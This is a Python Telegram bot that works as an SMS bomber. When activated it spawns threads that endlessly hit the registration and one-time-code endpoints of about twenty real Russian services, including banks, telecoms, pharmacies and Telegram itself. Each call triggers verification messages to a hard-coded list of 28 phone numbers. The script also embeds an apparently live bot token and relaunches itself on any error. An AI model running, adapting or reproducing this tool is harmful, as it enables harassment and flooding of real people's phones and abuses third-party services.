try:
	import requests, telebot, threading, fake_useragent, os
	from telebot import types
	from time import sleep

	bot = telebot.TeleBot('5092151783:AAEPQvxxEUxafShyYpsjcBolLfzAMEX4aBA')

	markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
	item1 = types.KeyboardButton('Активировать')
	item2 = types.KeyboardButton('Стоп')
	markup.add(item1)
	markup.add(item2)

	c=0
	messages=0

	def rass(phone):
		global messages
		global c
		headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36'}
		pulse = '+' + phone
		no7 = phone[1:]
		masska1 = '+7+(' + phone[1:4] + ')+' + phone[4:7] + '-' + phone[7:9] + '-' + phone[9:11]
		masska2 = phone[1:4] + '+' + phone[4:7] + '+' + phone[7:9] + '-' + phone[9:11]
		masska3 = phone[1:4] + '+' + phone[4:7] + '-' + phone[7:9] + '-' + phone[9:11]
		masska4 = '+7 (' + phone[1:4] + ') ' + phone[4:7] + '-' + phone[7:9] + '-' + phone[9:11]
		while range(5):
			if c == 1:
				try:
					requests.post("https://lenta.com/api/v1/registration/requestValidationCode", json={"phone" : "+" + phone}, headers=headers)
				except:
					pass

				try:requests.post("https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",
						    data={"phone": "+" + phone}, headers=headers, timeout=5.05)
				except:pass

				try:requests.post("https://my.telegram.org/auth/send_password",
						    data={"phone": "+" + phone}, headers=headers, timeout=5.05)
				except:pass
				try:requests.post("https://apteka.magnit.ru/api/personal/auth/code/", 
					    data={'phone': phone}, headers=headers, timeout=5.05)
				except:pass
				try:
					requests.get('https://www.askona.ru/api/registration/sendcode?csrf_token=214a57c11e2703c3e6745989f1031bc5&contact[phone]='+phone, headers=headers)
				except:
					pass
				try:
					requests.post('https://www.technopark.ru/graphql/', json={"operationName":"AuthStepOne","variables":{"phone":no7,"token":"9ea9pcg7td0muk9piuhqhhqp26","cityId":"36966"},"query":"mutation AuthStepOne($phone: String!, $token: String!, $cityId: ID!) @access(token: $token) @city(id: $cityId) {\n  sendOTP(phone: $phone)\n}\n"}, headers=headers)
				except:
					pass
				try:
					requests.post('https://services.open.ru/anketa_credit/api/public/credit/cash/application/confirm-code?utm_source=yandex', json={'phone': phone}, headers=headers)
				except:
					pass
				try:
					requests.post('https://pik-broker.ru/api-react/userpanel-v1/signup', json={'name': 'Дмитрий', 'phone': phone}, headers=headers)
				except:
					pass
				try:
					requests.post('https://api.apteka.ru/Auth/Auth_Code?cityId=5e57803249af4c0001d64407', json={'phone': masska4, 'u': 'U'}, headers=headers)
				except:
					pass
				try:
					requests.post('https://auth-ext.usvc.bcs.ru/auth/realms/Broker/protocol/openid-connect/token', data={'username': phone,
						'client_id': 'broker_otp_guest2_web',
						'grant_type': 'password'}, headers=headers)
				except:
					pass
				try:
					requests.post(
						'https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
						params={'msisdn': phone}, headers=headers)
				except:
					pass
				try:requests.post("https://login.mts.ru/amserver/UI/Login?service=login&srcsvc=sitemts&goto=https://moskva.mts.ru/json/auth/publicuser/afterlogin",
					    json= {
						"login": masska3,
						"IDToken1": no7,
						"IDButton": "Submit",
						"encoded": "false",
						"loginURL": "?service=sitemts&goto=https%3A%2F%2Fmoskva.mts.ru%2Fjson%2Fauth%2Fpublicuser%2Fafterlogin",
						"csrf.sign": "fee386083ef6b2ded9d9e2abebe2445ffee6750a32f501987d864a6b6aa619a7058e7f2ea0bfd3f3c0fafa9e34c0401071e07dfd620e9e7eeb8302205abe6ae4",
						"csrf.ts": "1630205683640"	
					    }, headers=headers, timeout=5.05)
				except:pass

				try:
					requests.post('https://kokao.revoup.ru/v2/auth', json={'mobile_phone': phone}, headers=headers)
				except:
					pass
				try:
					requests.post('https://disk.megafon.ru/api/3/md_otp_tokens/', json={"phone": '+' + phone}, headers=headers)
				except:
					pass
				try:
					requests.post('https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone,anonymRegistrationEnterPhone', data={"st.r.phone":"+"+phone}, headers=headers)
				except:
					pass

				try:requests.post("https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",
						data={"phone": pulse}, headers=headers)
				except:pass
				try:requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/", headers=headers)
				except:pass
				try:requests.post("https://my.modulbank.ru/api/v2/auth/phone", data={"CellPhone": phone[1:]}, headers=headers)
				except:pass
		c=0
	def spam():
		spisok = ['79283377250', '79283554900', '79054167505', '79187728436', '79282250106', '9282730902', '79283114967', '79283242868',
		'79283242868', '79283253559', '79283377496', '79283388702', '79288120752', '79288229307', '79289362956', '79383060437', '79383116034',
		'79383331917', '79383466610', '79282629692', '79283692011', '79383561425', '79614633813', '79620143533', '79886769139', '79887402946', '79888468363', '79993401950']
		for i in spisok:
			sleep(.1)
			print(i)
			t = threading.Thread(target=rass, args=(str(i),))
			t.start()

	@bot.message_handler()
	def get_text_messages(message):
	    global c
	    global messages
	    admin = 1046141020
	    messages = message.from_user.id
	    mess = message.text.lower()
	    if mess == "/start":
	        bot.send_message(messages, f"Бот активен 😊", reply_markup=markup)
	    elif mess[0:12] == 'активировать':
	    	if c == 0:
	    		bot.send_message(messages, "Бот активен ", reply_markup=markup)
	    		c=1
	    		spam()
	    	else:
	    		bot.send_message(messages, "Бот уже активен ", reply_markup=markup)
	    elif mess[0:4] == 'стоп':
	    	if c == 1:
	    		с=0
	    		bot.send_message(messages, "Остановка...", reply_markup=markup)
	    	else:
	    		bot.send_message(messages, 'Останавливать нечего ', reply_markup=markup)
	bot.polling(none_stop=True, interval=0)
except:
	os.system('python bot.py')
